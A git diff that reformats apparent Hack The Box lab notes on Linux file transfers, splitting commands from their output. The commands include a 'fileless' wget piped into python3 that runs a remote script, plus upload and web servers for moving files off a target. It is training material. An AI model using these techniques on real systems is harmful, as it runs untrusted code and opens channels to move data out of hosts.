@@ -131,7 +131,9 @@ Similarly, we can download a Python script file from a web server and pipe it in
 ### **Fileless Download with wget**
 
 ```
-th1nyunb0y@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3Hello World!
+th1nyunb0y@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+Hello World!
 ```
 
 ---
@@ -173,7 +175,9 @@ Before we begin downloading files from our target Linux machine to our Pwnbox, l
 ### **Enabling the SSH Server**
 
 ```bash
-th1nyunb0y@htb[/htb]$ sudo systemctl enable sshSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
+th1nyunb0y@htb[/htb]$ sudo systemctl enable ssh
+
+Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
 Executing: /lib/systemd/systemd-sysv-install enable ssh
 Use of uninitialized value$service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
 ...SNIP...
@@ -188,7 +192,8 @@ th1nyunb0y@htb[/htb]$ sudo systemctl start ssh
 ### **Checking for SSH Listening Port**
 
 ```bash
-th1nyunb0y@htb[/htb]$ netstat -lnpt(Not all processes could be identified, non-owned process info
+th1nyunb0y@htb[/htb]$ netstat -lnpt
+(Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -222,7 +227,8 @@ The first thing we need to do is to install the `uploadserver` module.
 ### **Pwnbox - Start Web Server**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo python3 -m pip install --user uploadserverCollecting uploadserver
+th1nyunb0y@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+Collecting uploadserver
   Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
 Installing collected packages: uploadserver
 Successfully installed uploadserver-2.0.1
@@ -233,7 +239,8 @@ Now we need to create a certificate. In this example, we are using a self-signed
 ### **Pwnbox - Create a Self-Signed Certificate**
 
 ```
-th1nyunb0y@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'Generating a RSA private key
+th1nyunb0y@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+Generating a RSA private key
 ................................................................................+++++
 .......+++++
 writing new private key to 'server.pem'
@@ -249,7 +256,8 @@ th1nyunb0y@htb[/htb]$ mkdir https && cd https
 ```
 
 ```
-th1nyunb0y@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pemFile upload available at /upload
+th1nyunb0y@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+File upload available at /upload
 Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
 ```
 
@@ -274,25 +282,31 @@ It is possible to stand up a web server using various languages. A compromised L
 ### **Linux - Creating a Web Server with Python3**
 
 ```
-th1nyunb0y@htb[/htb]$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+th1nyunb0y@htb[/htb]$ python3 -m http.server
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 ### **Linux - Creating a Web Server with Python2.7**
 
 ```
-th1nyunb0y@htb[/htb]$ python2.7 -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+th1nyunb0y@htb[/htb]$ python2.7 -m SimpleHTTPServer
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 ### **Linux - Creating a Web Server with PHP**
 
 ```
-th1nyunb0y@htb[/htb]$ php -S 0.0.0.0:8000[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
+th1nyunb0y@htb[/htb]$ php -S 0.0.0.0:8000
+[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
 ```
 
 ### **Linux - Creating a Web Server with Ruby**
 
 ```
-th1nyunb0y@htb[/htb]$ ruby -run -ehttpd . -p8000[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
+th1nyunb0y@htb[/htb]$ ruby -run -ehttpd . -p8000
+[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
 [2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
 [2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
 ```
@@ -300,7 +314,8 @@ th1nyunb0y@htb[/htb]$ ruby -run -ehttpd . -p8000[2022-05-23 09:35:46] INFO  WEBr
 ### **Download the File from the Target Machine onto the Pwnbox**
 
 ```
-th1nyunb0y@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
+th1nyunb0y@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
+--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
 Connecting to 192.168.49.128:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 0 [text/plain]
